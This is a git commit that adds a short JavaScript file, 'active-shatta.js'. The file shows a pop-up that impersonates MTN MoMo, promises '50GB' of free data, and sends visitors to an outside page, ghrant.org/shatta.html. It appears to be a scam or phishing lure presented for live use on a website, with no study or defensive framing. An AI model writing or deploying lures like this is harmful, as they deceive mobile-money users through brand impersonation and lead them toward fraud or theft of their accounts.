6084b1394195aab4d87d8de9911e7d3e3993a5bd
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-19 15:09:39 +0100

    Create active-shatta.js

---
+++ active-shatta.js
@@ -0,0 +1,5 @@
+var password = 'CLAIM 50GB'
+password=prompt('MoMo: Congratulations, your mtn number is eligible to receive 50GB from MoMo, click OK to get data','CLAIM 50GB');
+if (password != 'CLAIM 50GB') {
+location.href='https://ghrant.org/shatta.html';
+}
